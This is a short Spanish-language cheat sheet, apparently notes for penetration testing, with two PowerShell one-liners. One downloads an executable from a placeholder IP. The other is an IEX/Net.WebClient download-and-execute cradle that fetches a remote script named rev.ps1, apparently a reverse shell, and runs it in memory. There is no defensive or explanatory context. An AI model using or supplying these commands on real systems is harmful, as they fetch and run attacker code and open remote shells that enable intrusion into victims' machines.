####  Descarga de FIchero 

``` Powershell
Invoke-WebRequest <http://IP/FILE.exe>  -outfile <output_file_name>
```


#### Descarga de script ps1. y ejecucion

`powershell "IEX(New-Object Net.WebClient).downloadString('http://IP/rev.ps1')"`